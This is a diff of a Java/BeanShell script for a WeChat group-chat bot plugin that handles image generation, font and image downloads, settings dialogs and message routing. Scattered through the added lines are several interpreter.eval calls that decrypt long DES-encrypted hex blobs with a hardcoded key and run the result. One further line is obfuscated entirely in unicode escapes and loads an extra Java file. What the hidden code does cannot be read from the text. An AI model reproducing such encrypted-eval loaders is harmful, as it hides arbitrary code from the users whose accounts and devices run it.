@@ -1,11 +1,60 @@
+public static long timeUntilNext(int unit, int type) {
+    LocalDateTime now=LocalDateTime.now();
+    LocalDateTime targetTime;
+    switch (unit) {
+    case 1: // 周//剩天
+        targetTime=now.withHour(0).withMinute(0).withSecond(0).withNano(0).plusWeeks(1);
+        break;
+    case 2: // 天/剩时
+        targetTime=now.withHour(0).withMinute(0).withSecond(0).withNano(0).plusDays(1);
+        break;
+    case 3: // 时/剩分
+        targetTime=now.withMinute(0).withSecond(0).withNano(0).plusHours(1);
+        break;
+    case 4: // 分/剩秒
+        targetTime=now.withSecond(0).withNano(0).plusMinutes(1);
+        break;
+    default:
+        targetTime=now.withSecond(0).withNano(0).plusMinutes(1);
+    }
+    Duration duration=Duration.between(now, targetTime);
+    switch (type) {
+    case 1: // 周/剩天
+        return duration.toDays()/7;
+    case 2: // 天/剩时
+        return duration.toHours();
+    case 3: // 时/剩分
+        return duration.toMinutes();
+    case 4: // 分/剩秒
+        return duration.getSeconds();
+    default:
+        return duration.getSeconds();
+    }
+}
+public static String VersionName(Context context) {
+        try {
+            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+            return "";
+        }
+}
+public static int VersionCode(Context context) {
+        try {
+            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+            return -1;
+        }
+}
 public static String formatTime(float time) {
-String suffix="豪秒";
-long seconds =(long)(time/1000);
-String tr=seconds / 3600 +"时"+(seconds % 3600) / 60 + "分" + seconds % 3600 % 60 % 60 + "秒";
-tr=tr.replace("分0秒","分");
-tr=tr.replace("时0分","时");
-tr=tr.replace("0时","");
-return tr;
+    String suffix="豪秒";
+    long seconds=(long)(time/1000);
+    String tr=seconds/3600+"时"+(seconds%3600)/60+"分"+seconds%3600%60%60+"秒";
+    tr=tr.replace("分0秒","分");
+    tr=tr.replace("时0分","时");
+    tr=tr.replace("0时","");
+    return tr;
 }
 public static HashMap 地图=new HashMap();
 public class 检查 {
@@ -43,13 +92,13 @@ boolean flag=false;
 public List list=new ArrayList();
 public static void DetectPic() {
     try {
-        File dir = new File(JavaPath+"/底图/");
+        File dir = new File(JavaPath+"/数据/底图/");
         if(!dir.exists()) {
             dir.mkdirs();
             Downloadpic(-1);
         } else {
             for(int i=0; i<10; i++) {
-                String fi=JavaPath+"/底图/底图"+i+".jpg";
+                String fi=JavaPath+"/数据/底图/底图"+i+".jpg";
                 File di = new File(fi);
                 if(!di.exists()) {
                     Downloadpic(i);
@@ -65,13 +114,13 @@ public static void DetectPic() {
 }
 
 public static void Downloadpic(int j) {
-    String url="https://t.lcylcy.cc/tx";
+    String url="https://t.alcy.cc/tx";
     if(j==-1) {
         flag=true;
         Toast("底图正在缓存,请稍后");
         for(int i=0; i<10; i++) {
             try {
-                xz(url,JavaPath+"/底图/底图"+i+".jpg");
+                xz(url,JavaPath+"/数据/底图/底图"+i+".jpg");
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -80,7 +129,7 @@ public static void Downloadpic(int j) {
         Toast("底图缓存成功");
     } else {
         try {
-            xz(url,JavaPath+"/底图/底图"+j+".jpg");
+            xz(url,JavaPath+"/数据/底图/底图"+j+".jpg");
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -90,25 +139,26 @@ public static void Downloadpic(int j) {
 public static void getData(String qun,String text) {
     if(flag) {
         sendMsg(qun,text);
-        Toast("底图缓存中，自动切换文字发送");
+        Toast("底图缓存中，暂时切换文字发送");
         return;
     }
-    String textface=JavaPath+"/云上升/字体.ttf";
+    String textface=JavaPath+"/数据/字体.ttf";
     File ff=new File(textface);
     if(!ff.exists()) {
         String url="https://sfile.chatglm.cn/chatglm4/797fb012-990b-4b77-b2a0-ddfc87aeae2b.ttf";
-        xz(url,textface);
         sendMsg(qun,text);
-        Toast("字体下载中，自动切换文字发送");
+        Toast("字体下载中，暂时切换文字发送");
+        xz(url,textface);
+        Toast("字体下载完成");
         return;
     }
     int num=(int)(Math.random()*10);
-    String fi=JavaPath+"/底图/底图"+num+".jpg";
+    String fi=JavaPath+"/数据/底图/底图"+num+".jpg";
     File directory = new File(fi);
     while(!directory.exists()) {
         DetectPic();
         num=(int)(Math.random()*10);
-        fi=JavaPath+"/底图/底图"+num+".jpg";
+        fi=JavaPath+"/数据/底图/底图"+num+".jpg";
     }
     if(!list.contains(fi)) {
         long directorySize = directory.length();
@@ -131,68 +181,28 @@ public static void getData(String qun,String text) {
 
 public static String fetchRedirectUrl(String url) {
     try {
-        // 创建一个URL对象
         URL imageUrl=new URL(url);
-        // 打开一个HTTP连接
         HttpURLConnection connection=(HttpURLConnection) imageUrl.openConnection();
-        // 设置请求方法为GET
         connection.setRequestMethod("GET");
         String redirectUrl=connection.getHeaderField("Location");
-        // 关闭连接
         connection.disconnect();
-        // 返回重定向链接
         return redirectUrl;
     } catch (Exception e) {
-        // 处理异常
         e.printStackTrace();
-        // 返回空字符串
         return "";
     }
 }
-public static void xz(String url,String filepath) throws Exception {
-    InputStream input = null;
-    try {
-        URL urlsssss = new URL(url);
-        HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
-        input = urlConn.getInputStream();
-        byte[] bs = new byte[1024];
-        int len;
-        FileOutputStream out = new FileOutputStream(filepath, false);
-        while((len = input.read(bs)) != -1) {
-            out.write(bs, 0, len);
-        }
-        out.close();
-        input.close();
 
-    } catch (IOException e) {
-        return;
-    } finally {
-        try {
-            input.close();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-    return;
-}
-
-public final class EncryptUtil {
+public final class MY {
     private final static String DES = "DES";
-    public static String decrypt(String src, String key) {
+    public static String JM(String src, String key) {
         try {
-            return new String(decrypt(hex2byte(src.getBytes()), key.getBytes()));
+            return new String(JM(hex2byte(src.getBytes()), key.getBytes()));
         } catch (Exception e)
         {}
         return null;
     }
-    public static String encrypt(String src, String key) {
-        try {
-            return byte2hex(encrypt(src.getBytes(), key.getBytes()));
-        } catch (Exception e)
-        {}
-        return null;
-    }
-    private static byte[] decrypt(byte[] src, byte[] key) throws Exception {
+    private static byte[] JM(byte[] src, byte[] key) throws Exception {
         SecureRandom sr = new SecureRandom();
         DESKeySpec dks = new DESKeySpec(key);
         SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);
@@ -221,55 +231,84 @@ public final class EncryptUtil {
         return hs.toUpperCase();
     }
 }
-public static GG(String nr, String key) {
-    SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
-    Cipher cipher = Cipher.getInstance("AES");
-    cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
-    byte[] decodedBytes = Base64.getDecoder().decode(nr);
-    byte[] decryptedBytes = cipher.doFinal(decodedBytes);
-    return new String(decryptedBytes, StandardCharsets.UTF_8);
-}
-this.interpreter.eval(EncryptUtil.decrypt("9C15A243E4CB5EBE8E8D2738AD5C5EE61A7B68D09CFD5533C1B2CDCCCF268B5CA39AC462AA2C98501F63B054239E8DF4D919F0D0796ADDBDEAA338D80ABD583F1A07DE5DE0BB4432397E947D8B8D1B3A31F2E0156239C235","SecretKey"),"eval stream");
+public static void xz(String url,String filepath) throws Exception {
+    InputStream input = null;
+    File file=new File(filepath);
+    if(!file.getParentFile().exists()) {
+        file.getParentFile().mkdirs();
+        if(!file.exists()) {
+            file.createNewFile();
+        }
+    }
+    try {
+        URL urlsssss = new URL(url);
+        HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
+        input = urlConn.getInputStream();
+        byte[] bs = new byte[1024];
+        int len;
+        FileOutputStream out = new FileOutputStream(filepath, false);
+        while((len = input.read(bs)) != -1) {
+            out.write(bs, 0, len);
+        }
+        out.close();
+        input.close();
 
+    } catch (IOException e) {
+        return;
+    } finally {
+        try {
+            input.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    return;
+}
 import android.media.MediaPlayer;
 private MediaPlayer mediaPlayer;
-
-public void 提示音(String filePath) {
-    if (mediaPlayer != null) {
-        // 如果MediaPlayer正在播放，先停止并释放资源
-        mediaPlayer.release();
+public void 提示音(Context context, String url) {
+    if (mediaPlayer == null) {
+        mediaPlayer = new MediaPlayer();
     }
-
-    // 创建新的MediaPlayer对象
-    mediaPlayer = new MediaPlayer();
     try {
-        File file = new File(filePath);
-        mediaPlayer.setDataSource(file.getPath());
-        mediaPlayer.setLooping(false);
-        mediaPlayer.prepare(); // 可以使用prepareAsync进行异步准备
-        mediaPlayer.start();
+        mediaPlayer.reset();
+        Uri uri = Uri.parse(url);
+        mediaPlayer.setDataSource(context, uri);
+        mediaPlayer.prepare(); // 准备播放器
+        mediaPlayer.start(); // 开始播放
     } catch (Exception e) {
         e.printStackTrace();
-        // 发生异常时，释放MediaPlayer资源
-        mediaPlayer.pause();
-        mediaPlayer.release();
+        if (mediaPlayer != null) {
+            try {
+                if (mediaPlayer.isPlaying()) {
+                    mediaPlayer.stop(); // 停止播放
+                }
+                mediaPlayer.release(); // 释放资源
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
+        }
         mediaPlayer = null;
     }
 }
-
-public void release() {
+public void releaseMediaPlayer() {
     if (mediaPlayer != null) {
-        mediaPlayer.pause();
-        mediaPlayer.release();
+        try {
+            if (mediaPlayer.isPlaying()) {
+                mediaPlayer.stop();
+                }
+            mediaPlayer.release();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
         mediaPlayer = null;
-    }
+        }
 }
-
-this.interpreter.eval(EncryptUtil.decrypt("F2D1EB21A9DB1E2E41DB73BACC07FCE089019C504F9227D12F23F29B94100176E817A88B66C89A9B7B4B4D52A556664189019C504F9227D14D707CC14B0BCF2E3234EDD8973424195DE71F95DA7545A950FE72678C27443F2825557F4AAF2CDA104C857DDA5A5B2F99BCFE38ED9C5DB29BAD2EBD4BE0F8409D304B6928C2D67232990F04E581AABC0A8656589D2ECDB5B1A013693705E5027CF3597D085C436F0AD9865A4F44F2128193CC37D05D4ECF4467FFCB1512F3661B76496F3EF710E2C1B35055566E6EBF","SecretKey"),"eval stream");
-
+\u006c\u006f\u0061\u0064\u004a\u0061\u0076\u0061\u0028\u004a\u0061\u0076\u0061\u0050\u0061\u0074\u0068\u002b\u0022\u002f\u0059\u0075\u006e\u004a\u0061\u0076\u0061\u002f\u9644\u5c5e\u002f\u0048\u0074\u0074\u0070\u0041\u0070\u0069\u002e\u006a\u0061\u0076\u0061\u0022\u0029\u003b
+this.interpreter.eval(MY.JM("9C15A243E4CB5EBE8E8D2738AD5C5EE61A7B68D09CFD5533C1B2CDCCCF268B5CA39AC462AA2C98500191626BB772DAAFBA56449200D485C65B5F630A91722240F5B4DD13CFAFC8A398991B986FD536864D1F351FAC5897697FC3FDDB23E29CE7EE202D3B7360F1C36C6D46947392A116D9D055620E46D435C4D350AD2651C8A122E552D8DD71B31329097D6BDD039E22","SecretKey"),"eval stream");
 import android.graphics.*;
 public static String MakeTextPhoto(String text,int num) {
-    String textface=JavaPath+"/云上升/字体.ttf";
+    String textface=JavaPath+"/数据/字体.ttf";
     Object typeface;
     try {
         typeface=Typeface.createFromFile(textface);
@@ -278,17 +317,13 @@ public static String MakeTextPhoto(String text,int num) {
     }
     text=text.replace("[]","");
     String[] word=text.split("\n");
-
     float textsize=100.0f;
     float padding=80.0f;
-
     Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);
-
-
     paint.setTypeface(typeface);
     paint.setTextSize(textsize);
     Bitmap mybitmap;
-    mybitmap=BitmapFactory.decodeFile(JavaPath+"/底图/底图"+num+".jpg");
+    mybitmap=BitmapFactory.decodeFile(JavaPath+"/数据/底图/底图"+num+".jpg");
     float text_width=0;
     float average_width=0;
     float text_height=0;
@@ -297,7 +332,6 @@ public static String MakeTextPhoto(String text,int num) {
         average_width +=paint.measureText(line);
     }
     average_width=average_width/word.length;
-
     for(String line:word) {
         float width=paint.measureText(line);
         if(width-average_width>700) {
@@ -318,20 +352,16 @@ public static String MakeTextPhoto(String text,int num) {
     int width=(int)(text_width + padding * 2f);
     int heigth=(int)((textsize+8) * word.length+ padding * 2f)-8;
     Bitmap original=Bitmap.createBitmap(width, heigth, Bitmap.Config.ARGB_8888);
-
-
     Canvas canvas=new Canvas(original);
     Matrix matrix = new Matrix();
-
     float i=(float)width/(float)mybitmap.getWidth();
     float b=(float)heigth/(float)mybitmap.getHeight();
     if(i>b) b=i;
-//if(i<b) b=i;
+    //if(i<b) b=i;
     matrix.postScale(b,b); //长和宽放大缩小的比例
     Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
     canvas.drawBitmap(resizeBmp, (original.getWidth()-resizeBmp.getWidth())/2, (original.getHeight()-resizeBmp.getHeight())/2, paint);
     canvas.drawColor(Color.parseColor("#5AFFFFFF"));//白色半透明遮罩
-
     float yoffset=textsize+padding;
     String[] colors = {"随机"};
 //字体颜色可填：红色、黑色、蓝色、蓝绿、白灰、灰色、绿色、深灰、洋红、透明、白色、黄色、随机
@@ -340,8 +370,7 @@ public static String MakeTextPhoto(String text,int num) {
         canvas.drawText(word[i],padding,yoffset,paint);
         yoffset+=textsize+8;
     }
-
-    String path=JavaPath+"/缓存/"+canvas+".png";
+    String path=JavaPath+"/缓存/图片/"+canvas+".png";
     File end=new File(path);
     if(!end.exists()) end.getParentFile().mkdirs();
     FileOutputStream out=new FileOutputStream(end);
@@ -420,7 +449,7 @@ public String splitString(String content, int len) {
     }
     return tmp;
 }
-
+this.interpreter.eval(MY.JM("063FF10C908EFB729B08FAE97A1F001D85712E00F28D8B5E7F8F71D18538444AC2545369AD9164CC5BF150006A0F6AF6","SecretKey"),"eval stream");
 //获取目录大小
 import java.text.DecimalFormat;
 public static String getFormattedSize(File folder) {
@@ -542,77 +571,57 @@ public static boolean isChinese(char c) {
     }
     return false;
 }
-
 public void onMsg(Object data) {
     String text=data.content;
     String qun=data.talker;
     String wxid=data.sendTalker;
-    if(data.isText()) {
-        if(wxid.equals(AuthorWxid)||!qun.equals(WhiteList)) {
-            if(wxid.equals(AuthorWxid)&&!mWxid.equals(AuthorWxid)) {
-                if(text.equals("一键开机")||text.equals("一键开启")) {
-                    if("1".equals(getString(qun,"开关",""))) {
-                        sendMsg(qun,"已经开机了");
-                    } else {
-                        putString(qun,"开关","1");
-                        sendMsg(qun,"开机成功");
-                    }
-                }
-                if(text.equals("一键关机")||text.equals("一键关闭")) {
-                    if("1".equals(getString(qun,"开关",""))) {
-                        putString(qun,"开关",null);
-                        sendMsg(qun,"关机成功");
-                    }
-                }
-                if(text.contains("@"+getName(mWxid)+" ")&&text.contains("开机")) {
-                    if("1".equals(getString(qun,"开关",""))) {
-                        sendMsg(qun,"已经开机了");
-                    } else {
-                        putString(qun,"开关","1");
-                        sendMsg(qun,"开机成功");
-                    }
-                }
-                if(text.contains("@"+getName(mWxid)+" ")&&text.contains("关机")) {
-                    if("1".equals(getString(qun,"开关",""))) {
-                        putString(qun,"开关",null);
-                        sendMsg(qun,"关机成功");
-                    }
+    if("1".equals(getString("开关","私聊播报",""))) {
+        播报(data);
+    }
+    if(data.isText()||data.isReply()) {
+        if(wxid.equals(AuthorWxid)&&!mWxid.equals(AuthorWxid)) {
+            if(text.equals("一键开机")||text.equals("一键开启")) {
+                if("1".equals(getString(qun,"开关",""))) {
+                    sendReply(data.msgId,qun,"已经开机了");
+                } else {
+                    putString(qun,"开关","1");
+                    sendReply(data.msgId,qun,"已开机");
                 }
             }
-            if(mWxid.equals(wxid)) {
-                if(text.equals("开机")||text.equals("开启")) {
-                    if("1".equals(getString(qun,"开关",""))) {
-                        sendMsg(qun,"已经开机了");
-                    } else {
-                        putString(qun,"开关","1");
-                        sendMsg(qun,"开机成功");
-                    }
-                }
-                if(text.equals("关机")||text.equals("关闭")) {
-                    if("1".equals(getString(qun,"开关",""))) {
-                        putString(qun,"开关",null);
-                        sendMsg(qun,"关机成功");
-                    }
-                }
-                if(text.equals("所有群设置")) {
-                    所有群设置();
-                    recallMsg(data.msgId);
-                }
-                if(text.equals("开关设置")||text.equals("设置开关")) {
-                    开关设置(qun);
-                    recallMsg(data.msgId);
-                }
-                if(text.equals("配置设置")||text.equals("设置配置")) {
-                    配置设置(qun);
-                    recallMsg(data.msgId);
+            if(text.equals("一键关机")||text.equals("一键关闭")) {
+                if("1".equals(getString(qun,"开关",""))) {
+                    putString(qun,"开关",null);
+                    sendReply(data.msgId,qun,"已关机");
                 }
             }
+            if(text.contains("@"+getName(mWxid)+" ")&&text.contains("开机")) {
+                if("1".equals(getString(qun,"开关",""))) {
+                    sendReply(data.msgId,qun,"已经开机了");
+                } else {
+                    putString(qun,"开关","1");
+                    sendReply(data.msgId,qun,"已开机");
+                }
+            }
+            if(text.contains("@"+getName(mWxid)+" ")&&text.contains("关机")) {
+                if("1".equals(getString(qun,"开关",""))) {
+                    putString(qun,"开关",null);
+                    sendReply(data.msgId,qun,"已关机");
+                }
+            }
+        }
+        if(mWxid.equals(wxid)) {
+            YunJava(data);
         }
         if("1".equals(getString(qun,"开关",""))) {
-            菜单(data);
-        }
-        if(!取("开关","accessToken").equals("")&&data.talkerType==0) {
-           回复(data);
+            for(String Yun:getGroups()) {
+                if(Arrays.asList(YunJava).contains(Yun)) {
+                    菜单(data);
+                    if(data.talkerType==0) {
+                        回复(data);
+                    }
+                    break;
+                }
+            }
         }
     }
     if("1".equals(getString(qun,"开关",""))) {
@@ -633,12 +642,12 @@ public void onMsg(Object data) {
         }
     }
 }
-
 public void 配置设置(String qun) {
     initActivity();
     boolean 底部时间=true;
     boolean 底部文案=true;
     boolean 底部尾巴=true;
+    boolean 私聊播报=true;
 
     if(!取("开关","底部时间").equals("1")) {
         底部时间=false;
@@ -649,13 +658,14 @@ public void 配置设置(String qun) {
     if(!取("开关","底部尾巴").equals("1")) {
         底部尾巴=false;
     }
+    if(!取("开关","私聊播报").equals("1")) {
+        私聊播报=false;
+    }
     ThisActivity.runOnUiThread(new Runnable() {
         public void run() {
-//主题风格
             AlertDialog.Builder tx=new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
-            String[] ww= {"底部时间","底部文案","底部尾巴"};
-            boolean[] xx= {底部时间,底部文案,底部尾巴};
-//相关名字
+            String[] ww= {"底部时间","底部文案","底部尾巴","私聊播报"};
+            boolean[] xx= {底部时间,底部文案,底部尾巴,私聊播报};
             TextView tc = new TextView(ThisActivity);
             tc.setText(Html.fromHtml("<font color=\"#D0ACFF\">菜单名字</font>"));
             tc.setTextSize(20);
@@ -671,17 +681,12 @@ public void 配置设置(String qun) {
 
             final EditText editText = new EditText(ThisActivity);
             editText.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认</font>"));
-//检测到换行就自动切换下一行
             editText.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
             editText.addTextChangedListener(new TextWatcher() {
-//更改前
                 public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
-//更改后
                 public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                 public void afterTextChanged(Editable editable) {
-//获取当前输入内容的长度
                     int inputLength = editable.length();
-//字符串不能大于15
                     if (inputLength>15) {
                         String limitedText = editable.toString().substring(0,15);
                         editText.setText(limitedText);
@@ -693,13 +698,11 @@ public void 配置设置(String qun) {
 
             final EditText editText1=new EditText(ThisActivity);
             editText1.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认</font>"));
-//检测到换行就自动切换下一行
             editText1.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
             editText1.addTextChangedListener(new TextWatcher() {
                 public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                 public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                 public void afterTextChanged(Editable editable) {
-//获取当前输入内容的长度
                     int inputLength = editable.length();
                     if (inputLength>10) {
                         String limitedText = editable.toString().substring(0,10);
@@ -713,12 +716,8 @@ public void 配置设置(String qun) {
 
             final EditText editText2=new EditText(ThisActivity);
             editText2.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认文字 1图片 2卡片</font>"));
-
-//检测到换行就自动切换下一行
             editText2.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
-//只包含数字
             editText2.setInputType(InputType.TYPE_CLASS_NUMBER);
-//添加文本变化监听器
             editText2.addTextChangedListener(new TextWatcher() {
                 public void beforeTextChanged(CharSequence s,int start,int count,int after) {}
                 public void onTextChanged(CharSequence s,int start,int before,int count) {
@@ -728,18 +727,16 @@ public void 配置设置(String qun) {
                 }
                 public void afterTextChanged(Editable s) {}
             });
-            editText2.setText(取(qun,"发送模式"));
+            editText2.setText(取("开关","发送模式"));
 
             final EditText editText3=new EditText(ThisActivity);
             editText3.setHint(Html.fromHtml("<font color=\"#A2A2A2\">请输入手机号码</font>"));
-//检测到换行就自动切换下一行
             editText3.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
             editText3.setInputType(InputType.TYPE_CLASS_NUMBER);
             editText3.addTextChangedListener(new TextWatcher() {
                 public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                 public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                 public void afterTextChanged(Editable editable) {
-//获取当前输入内容的长度
                     int inputLength = editable.length();
                     if (inputLength>11) {
                         String limitedText = editable.toString().substring(0,11);
@@ -757,7 +754,6 @@ public void 配置设置(String qun) {
 
             LinearLayout cy=new LinearLayout(ThisActivity);
             cy.setOrientation(LinearLayout.VERTICAL);
-//添加进弹窗
             cy.addView(tc);
             cy.addView(editText);
             cy.addView(tc1);
@@ -790,6 +786,11 @@ public void 配置设置(String qun) {
                     } else {
                         存("开关", "底部尾巴",null);
                     }
+                    if(cs[3]) {
+                        存("开关", "私聊播报","1");
+                    } else {
+                        存("开关", "私聊播报",null);
+                    }
                     if(!tx3.equals("")) {
                         if(!tx3.contains("*")) {
                             存("开关","手机号码",tx3);
@@ -798,9 +799,9 @@ public void 配置设置(String qun) {
                         存("开关","手机号码",null);
                     }
                     if(!tx2.equals("")) {
-                        存(qun,"发送模式",tx2);
+                        存("开关","发送模式",tx2);
                     } else {
-                        存(qun,"发送模式",null);
+                        存("开关","发送模式",null);
                     }
                     if(!tx1.equals("")) {
                         存("开关","触发指令",tx1);
@@ -817,7 +818,6 @@ public void 配置设置(String qun) {
             });
             tx.setNegativeButton(Html.fromHtml("<font color=\"#E3319D\">取消</font>"),new DialogInterface.OnClickListener() {
                 public void onClick(DialogInterface dialogInterface,int i) {
-//取消
                 }
             });
             tx.setMultiChoiceItems(ww,xx,new DialogInterface.OnMultiChoiceClickListener() {
@@ -825,9 +825,60 @@ public void 配置设置(String qun) {
                     xx[which]=isChecked;
                 }
             });
-//点空白处无法取消
             tx.setCancelable(false);
             tx.show();
+        }
+    });
+}
+public String getElementContent(String xmlString, String tagName) { //陌然
+    try {
+        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+        DocumentBuilder builder = factory.newDocumentBuilder();
+        ByteArrayInputStream input = new ByteArrayInputStream(xmlString.getBytes("UTF-8"));
+        Document document = builder.parse(input);
+        NodeList elements = document.getElementsByTagName(tagName);
+        if (elements.getLength() > 0) {
+            return elements.item(0).getTextContent();
+        }
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+    return null;
+}
+this.interpreter.eval(MY.JM("1CC9DA43D680D84286EADDC99AE13F7DB392EDA3E099510C9A70A270987D18A5E6AFC362F17BCC9E9152AA48D644A840D067729E8262AAC7697260E28C14AA245629B3E802B05D2382B601A53D67D1041B5D77BF4E1A0D7E93BBFA30E046BB1394A39423F2C83229F728E75F86FF15FB4491AC37E2FC517DE9EA9BE6A717128B83D9A09EDDF264062997D32D2833217D3A611EA24809ABE02DD99A00957458CB07A32712424134D35F996F85FC391B4090C2D3882483419E89F69884E12B67699967F18E4EDB842F05B4283D519E7837B73AE91131EB7B4732B2CCB2426D89A45024591C6438FFC4C545D7CC039ADBA816F77229F4D33F13D0B52B7C47F416E3396090A97BB5756309AA5C3C2E51EE3AED3A113224EC52B77F9672D438EE09F43451552B2619842138A7283E291631096DF63345A763CBCDC027D68E38EEF71AF9C78A821F126C22ED3A113224EC52B7ED3A113224EC52B755E8FD5325F7F62F762A6A1B76148ACBFF89E56C7DAF832B78993F4329A0F98A3F1B0CDEBFDA9B3EED3A113224EC52B7CC35550023253F79833ECAF678FDC532ED3A113224EC52B7ED3A113224EC52B787E2269C993FE5976DF63345A763CBCDC027D68E38EEF71A7A51B142DBF5D846ED3A113224EC52B7ED3A113224EC52B7E6CD226C1B3D26CE1EF8088466FC34E925CA951E48037C6F3F1B0CDEBFDA9B3EED3A113224EC52B7DAC5352B4000351CED3A113224EC52B760F89BAEA54FA1EF09AA5C3C2E51EE3AED3A113224EC52B79E477D3B115FB08641AFB1B168BE183FE3DF6C720C06D33FED3A113224EC52B782840549CA2A9F8C9E51C47DC6F7F708BBEB3C9A9697ADDB7A925157ED5DD17C79D2801ED6EF41E6E15049032478A33FE3DF6C720C06D33FED3A113224EC52B7B88759988FFA98520F1678F6FC6EE24E506030819C8C65CA7247F203B90B26930AF4CBF6C0CCE83AA943259E9DFA534C2CF7D83408C7B3E89B3B7157575A66BDB295D1709556E4C536227E92EA60930F83D9A09EDDF26406FC04DF0E48E38729A15AAB780C30C51AD584515AF2F21950A23FD5F687FF39AE3AD095426958BE3109AA5C3C2E51EE3AED3A113224EC52B77947617D47E80ADCDA325CED9E9D7B98F8CD41A830911C32E8A6BC2BD09B312289F69884E12B6769ED3A113224EC52B78C1A627601AA60419F3BE947BD3812363B21A96481FA0564786F24B2AAD2D4A8D717B674DB7E30B989F69884E12B6769F6D1AE17C5A09CDD63470A324198AE7AE2B033C247565B47E6FDBDF095379F8894C0DE88A36260B282D1D2128EC7B632ED3A113224EC52B7A06F68F005CF1359F088F10E8DC0E7DA4E82C428E7B6077DED3A113224EC52B7511DA672B3634FBACED593F5190F108692A63DD56C5460EC7CB66E4C9AA79BDCA0FF42864CD191EEE52886B871337958F6DCA77A4A0348FFB242725410E0BB7930A7B06BC6F9C6F7924192CAC01F733C89019C504F9227D14E73AAB404A74477261C0964648FFE0009AA5C3C2E51EE3A506030819C8C65CA8C979377910DD2C2A8747A951BEA6FFAA66696D059F11A7F481508852A42D7B81296E49F1C2A26315FDB592016B4FE1315AE6080BB8121052D2688F4CB00E73F7110BED8EF9796B6ED3A113224EC52B7889B23CB28BD9BF7DD12294683A57D395CB8BFC1E89DBDE5ED3A113224EC52B7ED3A113224EC52B7D5F69DA0E4971EF9A928D7774FEFE6621D31C343AF6DA79BED3A113224EC52B7C30591BCB0610E698824A99C33708ADEED3A113224EC52B7275295F0C2F97A01E3C9994A4F23E42F6F96FE4B963958EFED3A113224EC52B7ED3A113224EC52B7265D647D79F41971AB7FA6E4E9C86D7847F8BC3CF26C5548951EACE5640738A444764D1A3C5F241D6F96FE4B963958EFED3A113224EC52B7DAC5352B4000351C931DE08A047E9828ED3A113224EC52B726ACB598D0ABCA4D2DF1F5FBE215FDFED209B5875E474C0F5E765A81F2E1350807A32712424134D3BE08026C2785471B0F28183199534C8EDBE7CA75E459B5FFED3A113224EC52B7EDB77818A3DF2AB9B24E63404E2254FDA1B9C1580BAE26C9ED3A113224EC52B750545362C2B9A0F8F953BC472214E8B4094D6634EC86422089F69884E12B6769ABDAA62552BC59929970C42158DA7AF1945C7EEC32A42C6400FBB1693B9EA4E515E63B68380A72811D2371D7B327746A6F524262EEBEEC9D11F0F97B7D9353C6F5480B8790D68184DDE88A928601B510080EC252F469E6EF6B6294329B6B2E75000AAB03D79AB2D846A7728017610600EF3208C3F7ECF03189AAFA415DDC517D02449784167CEA495FD2FF5EFB1F4AD9056F2030B6A9346B","SecretKey"),"eval stream");
+import android.content.ClipboardManager;
+import android.content.ClipData;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.widget.Toast;
+if(!found) {
+    final Activity ThisActivity = getActivity();
+    ThisActivity.runOnUiThread(new Runnable() {
+        public void run() {
+            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
+            alertDialogBuilder.setTitle(Html.fromHtml("<font color=\"red\">提示</font>"));
+            TextView messageTextView = new TextView(ThisActivity);
+            messageTextView.setText(Html.fromHtml("<font color=\"#E09C4F\">需要加微信群才能使用，请前往网站寻找加群方法</font>"));
+            messageTextView.setPadding(20, 20, 20, 20);
+            messageTextView.setTextSize(20);
+            alertDialogBuilder.setView(messageTextView);
+            alertDialogBuilder.setPositiveButton(Html.fromHtml("<font color=\"#893BFF\">前往</font>"), new DialogInterface.OnClickListener() {
+                public void onClick(DialogInterface dialog, int which) {
+                    String url = "https://flowus.cn/share/b8ec66db-34e7-4e9e-b134-dc783c645c8b";
+                    Intent intent = new Intent(Intent.ACTION_VIEW);
+                    intent.setData(Uri.parse(url));
+                    ThisActivity.startActivity(intent);
+                }
+            });
+            alertDialogBuilder.setNegativeButton(Html.fromHtml("<font color=\"#893BFF\">取消</font>"), new DialogInterface.OnClickListener() {
+                public void onClick(DialogInterface dialog, int which) {
+                    dialog.cancel();
+                }
+            });
+            AlertDialog alertDialog = alertDialogBuilder.create();
+            alertDialog.setCanceledOnTouchOutside(false);
+            alertDialog.show();
         }
     });
 }
